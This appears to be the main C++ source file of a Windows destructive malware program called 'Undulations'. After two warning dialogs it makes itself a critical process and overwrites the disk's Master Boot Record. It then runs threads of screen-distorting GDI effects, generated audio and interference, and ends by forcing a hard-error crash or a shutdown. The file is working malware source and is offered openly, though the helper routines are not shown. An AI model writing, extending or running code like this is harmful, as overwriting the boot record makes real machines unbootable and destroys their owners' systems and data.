#include "Undulations.h"

static FunctionalPrivilege FunPrivilege;
DiskOperation diskOperation;

typedef struct
{
	DWORD width;
	DWORD height;
	float winDPI;
} SCREENSIZE;


EFFECTARRAY EffectProcess[20] = {
	{&EffectGenerator::DrawShader1,20,true,true},{&EffectGenerator::DrawShader2,20,true,true},
	{&EffectGenerator::DrawShader3,15,false,false},{&EffectGenerator::DrawShader4,20,true,false},
	{&EffectGenerator::DrawShader5,20,false,true},{&EffectGenerator::DrawShader6,20,true,false},
	{&EffectGenerator::DrawShader7,20,true,false},{&EffectGenerator::DrawShader8,15,true,false},
	{&EffectGenerator::DrawShader9,15,false,false},{&EffectGenerator::DrawShader10,20,false,true},
	{&EffectGenerator::DrawShader11,15,false,false},{&EffectGenerator::DrawShader12,15,false,false},
	{&EffectGenerator::DrawShader13,10,false,true},{&EffectGenerator::DrawShader14,15,false,false},
	{&EffectGenerator::DrawShader15,20,false,false},{&EffectGenerator::DrawShader16,15,false,false},
	{&EffectGenerator::DrawShader17,10,false,true},{&EffectGenerator::DrawShader18,10,true,false},
	{&EffectGenerator::DrawShader19,15,false,false},{&EffectGenerator::DrawShader20,20,false,true}
};


AUDIOARRAY pAudio[20] = {
	{22050,22050 * 250,{{296,5},{352,4},{352,8},{443,7},{296,4},{332,5},{332,2},{296,9},{264,2},{394,4},{526,4},{352,3},{352,4},{443,7},{526,7},{264,5},{352,4},{443,6},{264,4},{526,2},{526,9},{296,7},{443,8},{526,3},{526,9},{394,5},{296,7},{332,9},{332,7},{496,4}}},
	{22050,22050 * 250,{{443,7},{296,3},{496,7},{496,4},{526,2},{443,3},{264,5},{443,6},{352,4},{394,10},{352,10},{332,8},{496,9},{332,10},{352,10},{394,8},{526,7},{352,6},{394,6},{332,2},{352,10},{332,8},{496,3},{332,3},{394,6},{496,5},{352,3},{526,6},{443,3},{332,4}}},
	{22050,22050 * 250,{{296,5},{352,3},{526,7},{443,7},{352,6},{296,7},{332,9},{352,2},{443,3},{394,4},{352,2},{394,10},{332,7},{352,7},{332,7},{332,2},{296,4},{496,8},{296,9},{332,2},{296,4},{296,8},{352,7},{352,5},{296,6},{443,10},{296,9},{526,2},{264,2},{352,7}}},
	{22050,22050 * 250,{{526,2},{443,3},{264,10},{496,2},{332,6},{352,9},{352,9},{443,6},{443,10},{443,5},{496,7},{352,7},{352,9},{352,5},{352,6},{443,2},{443,10},{496,7},{443,7},{394,3},{352,9},{526,2},{352,3},{526,8},{352,8},{496,10},{443,5},{264,3},{526,6},{332,2}}},
	{22050,22050 * 250,{{496,7},{394,10},{526,6},{394,2},{296,4},{394,9},{496,7},{332,10},{394,9},{443,4},{496,3},{332,10},{296,10},{443,2},{352,3},{496,5},{264,6},{496,6},{332,8},{264,7},{332,10},{296,3},{496,4},{496,10},{352,7},{496,5},{443,9},{394,6},{264,3},{526,7}}},
	{22050,22050 * 250,{{526,3},{332,7},{496,5},{394,3},{394,7},{443,6},{296,9},{394,4},{264,6},{526,9},{332,4},{443,8},{394,7},{496,9},{394,2},{352,5},{496,3},{352,3},{496,3},{264,2},{443,3},{332,7},{394,7},{264,4},{526,9},{264,4},{352,2},{332,5},{394,5},{332,4}}},
	{22050,22050 * 250,{{296,3},{526,8},{443,6},{496,8},{296,6},{352,3},{352,7},{496,4},{264,10},{526,3},{332,2},{352,5},{496,7},{496,10},{352,10},{352,7},{332,6},{526,3},{296,6},{296,6},{496,4},{296,9},{394,5},{443,4},{332,5},{443,8},{296,9},{264,6},{296,10},{352,7}}},
	{22050,22050 * 250,{{332,10},{526,4},{264,9},{394,10},{296,4},{332,3},{352,10},{394,4},{296,7},{526,4},{496,5},{332,7},{496,4},{394,9},{526,3},{526,9},{443,3},{332,3},{264,6},{526,6},{264,4},{443,10},{264,4},{332,6},{394,6},{332,8},{496,2},{394,5},{526,7},{352,9}}},
	{22050,22050 * 250,{{526,6},{352,8},{496,5},{264,2},{394,3},{443,8},{352,7},{394,10},{352,6},{264,3},{496,6},{296,8},{394,3},{352,5},{496,3},{526,2},{296,4},{264,2},{264,10},{443,2},{352,7},{264,3},{443,9},{443,4},{394,6},{394,3},{296,3},{352,4},{264,3},{264,2}}},
	{22050,22050 * 250,{{264,6},{296,8},{443,3},{264,6},{443,6},{352,8},{443,10},{296,10},{443,3},{526,8},{332,8},{394,2},{264,7},{352,6},{332,10},{332,6},{352,5},{264,4},{394,9},{394,6},{264,8},{296,3},{332,7},{296,10},{332,8},{496,4},{264,10},{264,8},{296,3},{394,4}}},
	{22050,22050 * 100,{{526,4},{443,5},{264,4},{526,10},{264,7},{443,5},{352,4},{496,4},{496,6},{296,4},{394,5},{443,7},{526,5},{332,3},{443,9},{296,2},{496,10},{394,4},{443,6},{443,3},{526,6},{443,5},{332,7},{264,7},{394,3},{443,7},{443,5},{332,10},{443,5},{443,6}}},
	{22050,22050 * 100,{{526,3},{352,10},{352,9},{394,8},{526,3},{526,2},{443,9},{296,7},{332,8},{394,6},{496,3},{526,2},{296,7},{394,2},{352,8},{394,8},{352,6},{264,9},{332,2},{496,8},{352,4},{352,2},{526,3},{443,9},{443,10},{264,7},{264,5},{496,2},{496,5},{332,4}}},
	{22050,22050 * 100,{{496,8},{332,7},{352,5},{352,8},{496,2},{264,10},{264,8},{496,2},{296,7},{394,4},{526,8},{496,5},{526,8},{496,8},{352,5},{443,10},{526,2},{296,9},{264,3},{352,3},{332,5},{496,3},{332,4},{443,2},{394,9},{264,2},{264,9},{332,4},{526,2},{264,9}}},
	{22050,22050 * 100,{{394,2},{394,9},{526,3},{496,5},{296,9},{296,3},{332,3},{526,6},{296,9},{394,9},{352,7},{443,4},{332,5},{443,4},{526,5},{296,5},{352,10},{264,9},{332,10},{352,3},{332,4},{496,4},{332,6},{394,6},{332,6},{296,2},{526,8},{443,4},{296,8},{352,3}}},
	{22050,22050 * 100,{{526,2},{296,9},{496,3},{526,10},{496,7},{526,10},{394,10},{296,6},{296,3},{394,3},{352,6},{394,10},{394,6},{443,5},{496,4},{296,7},{526,4},{394,8},{443,4},{394,7},{352,5},{443,6},{332,5},{332,6},{443,2},{443,6},{443,5},{352,5},{496,4},{443,6}}},
	{22050,22050 * 100,{{394,7},{296,7},{443,5},{443,9},{296,10},{264,2},{264,5},{296,9},{296,5},{352,4},{264,4},{526,2},{352,2},{526,2},{394,9},{443,3},{264,7},{264,2},{394,10},{443,2},{526,5},{296,5},{352,6},{264,5},{264,8},{352,6},{496,10},{496,10},{352,5},{443,10}}},
	{22050,22050 * 100,{{352,3},{264,4},{394,10},{394,9},{296,8},{296,2},{352,3},{496,4},{526,4},{352,2},{264,9},{496,5},{296,3},{264,8},{352,6},{496,5},{394,3},{296,10},{296,10},{296,6},{496,5},{394,6},{496,8},{526,7},{526,7},{352,10},{496,4},{352,3},{352,2},{352,6}}},
	{22050,22050 * 100,{{264,6},{496,3},{526,9},{394,7},{526,6},{443,9},{296,6},{332,10},{352,6},{394,7},{394,6},{443,10},{443,8},{443,3},{526,9},{332,8},{264,7},{526,10},{443,3},{394,6},{332,7},{443,8},{526,4},{332,7},{443,5},{443,10},{264,9},{264,9},{496,7},{496,6}}},
	{22050,22050 * 100,{{394,6},{526,6},{526,9},{296,2},{264,4},{296,10},{526,6},{296,8},{526,10},{352,10},{443,7},{394,2},{496,10},{526,5},{526,5},{352,2},{394,5},{394,10},{496,2},{352,10},{526,6},{352,9},{496,9},{394,2},{264,9},{264,5},{332,10},{352,4},{332,4},{264,4}}},
	{22050,22050 * 100,{{264,6},{394,7},{496,3},{352,8},{296,8},{526,5},{264,7},{264,8},{443,2},{443,2},{264,2},{526,2},{496,5},{526,6},{264,6},{526,10},{296,9},{394,7},{526,9},{264,5},{394,9},{264,4},{264,8},{352,3},{264,6},{526,4},{526,7},{332,3},{352,6},{496,8}}},
};



void GetMInfo(HWND hWnd, SCREENSIZE* pSize)
{
	MONITORINFOEX monitorInfo;
	DEVMODE devMode;
	ZeroMemory(&monitorInfo, sizeof(monitorInfo));
	ZeroMemory(&devMode, sizeof(devMode));
	HMONITOR hMonitor = MonitorFromWindow(hWnd, MONITOR_DEFAULTTONEAREST);
	monitorInfo.cbSize = sizeof(MONITORINFOEX);
	devMode.dmSize = sizeof(DEVMODE);

	GetMonitorInfo(hMonitor, &monitorInfo);
	EnumDisplaySettings(monitorInfo.szDevice, ENUM_CURRENT_SETTINGS, &devMode);
	DWORD wLogical = (monitorInfo.rcMonitor.right - monitorInfo.rcMonitor.left);

	pSize->width = devMode.dmPelsWidth;
	pSize->height = devMode.dmPelsHeight;
	pSize->winDPI = ((float)devMode.dmPelsWidth / (float)wLogical);
}



void WINAPI EffectThreadProc(LPVOID lpParameter)
{
	HWND hWnd = NULL, winHwnd = NULL;
	HDC hdc = NULL, winHdc = NULL;
	RECT pRect = { 0 };
	DWORD pWidth = 0, pHeight = 0;
	SCREENSIZE pSize = { 0 };
	for (int i = 0; i < 20; i++)
	{
		EffectGenerator Generator;

		hWnd = GetDesktopWindow();
		winHwnd = GetForegroundWindow();
		hdc = GetWindowDC(hWnd);
		winHdc = GetWindowDC(winHwnd);
		GetMInfo(hWnd, &pSize);
		GetWindowRect(winHwnd, &pRect);

		pWidth = (DWORD)((float)(pRect.right - pRect.left) * pSize.winDPI);
		pHeight = (DWORD)((float)(pRect.bottom - pRect.top) * pSize.winDPI);

		Generator.EGenerator(hdc, pSize.width, pSize.height, EffectProcess[i]);
		Generator.EGenerator(winHdc, pWidth, pHeight, EffectProcess[rand() % 2]);

		AudioGenerator::audioFlag = false;
		InterferenceClass::interferenceFlag = false;
		ReleaseDC(hWnd, hdc);
		ReleaseDC(winHwnd, winHdc);
	}

	if (!FunPrivilege.HardError())
	{
		diskOperation.ShutDown();
	}

}


void WINAPI AudioThreadProc(LPVOID lpParameter)
{
	AudioGenerator Generator;
	for (int i = 0; i < 20; i++)
	{
		Generator.AGenerator(pAudio[i].sampleRate, pAudio[i].waveLength, pAudio[i], 30);
	}
}


void WINAPI InterferenceThreadProc(LPVOID lpParameter)
{
	InterferenceClass interferenceClass;
	for (int i = 0; i < 20; i++)
	{
		interferenceClass.Interference(i);
	}
}



int APIENTRY WinMain(_In_ HINSTANCE hInst, _In_opt_ HINSTANCE hInstPrev, _In_ PSTR cmdline, _In_ int cmdshow)
{

	HANDLE hMutex = CreateMutex(NULL, false, TEXT("Undulations"));
	if (GetLastError() == ERROR_ALREADY_EXISTS)
	{
		return 0;
	}

	LPCWSTR warnInformation = { 0 }, warnInformation2 = { 0 }, errorInformation = { 0 };
	UINT nLanID = GetSystemDefaultLangID();
	WORD PriLan = PRIMARYLANGID(nLanID);
	if (PriLan == LANG_CHINESE)
	{
		warnInformation = TEXT("这是恶意程序，会导致您的计算机无法正常工作。\n如果您不慎打开，请单击“取消”按钮取消运行。如果您要运行，请确保该恶意程序已经部署在安全的环境中，然后单击“确定”按钮继续运行。\n\n您需要自行承担该恶意程序造成的一切后果。");
		warnInformation2 = TEXT("这是最后一次提醒。\n如果以上是您操作过于仓促造成，请单击 “取消” 按钮取消运行，否则单击 “确定” 按钮继续运行。\n\n您需要自行承担该恶意程序造成的一切后果。");
		errorInformation = TEXT("发生致命错误，应用程序运行失败。请单击“确定”关闭应用程序");
	}
	else
	{
		warnInformation = TEXT("This is a malicious program that will cause your computer to malfunction.\nIf you have opened it by mistake, please click the \"Cancel\" button to stop running it. If you intend to run it, please ensure that the malicious program has been deployed in a secure environment, and then click the \"OK\" button to proceed.\n\nYou are solely responsible for any consequences caused by this malicious program.");
		warnInformation2 = TEXT("This is the final reminder.\nIf the above action was caused by haste on your part, please click the \"Cancel\" button to abort the operation. otherwise, click the \"OK\" button to proceed.\n\nYou are solely responsible for any consequences caused by this malicious program.");
		errorInformation = TEXT("A fatal error has occurred and the application has failed to run. Please click \"OK\" to close the application.");
	}


	if (MessageBox(NULL, warnInformation, TEXT("Undulations"), MB_OKCANCEL) == IDOK)
	{
		if (MessageBox(NULL, warnInformation2, TEXT("Undulations"), MB_OKCANCEL) == IDCANCEL)
		{
			return 0;
		}
	}
	else
	{
		return 0;
	}



	TCHAR szExeFileName[MAX_PATH];
	GetModuleFileName(NULL, szExeFileName, MAX_PATH);
	if (FunPrivilege.SetCriticalProcess(true))
	{

		if (FunPrivilege.HardErrorInitialization())
		{
			if (!diskOperation.WriteMBR())
			{
				FunPrivilege.SetCriticalProcess(false);
				MessageBox(NULL, errorInformation, szExeFileName, MB_ICONERROR);
				return -1;
			}
		}
		else
		{
			FunPrivilege.SetCriticalProcess(false);
			MessageBox(NULL, errorInformation, szExeFileName, MB_ICONERROR);
			return -1;
		}

	}
	else
	{
		FunPrivilege.SetCriticalProcess(false);
		MessageBox(NULL, errorInformation, szExeFileName, MB_ICONERROR);
		return -1;
	}

	Sleep(7000);

	srand((unsigned int)time(0));

	HANDLE hInterferenceThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)InterferenceThreadProc, NULL, 0, NULL);
	HANDLE hAudioThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)AudioThreadProc, NULL, 0, NULL);
	HANDLE hEffectThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)EffectThreadProc, NULL, 0, NULL);

	MSG msg = { 0 };
	if (GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	WaitForSingleObject(&hInterferenceThread, INFINITE);
	WaitForSingleObject(&hAudioThread, INFINITE);
	WaitForSingleObject(&hEffectThread, INFINITE);
	CloseHandle(&hInterferenceThread);
	CloseHandle(&hAudioThread);
	CloseHandle(&hEffectThread);

	return 0;
}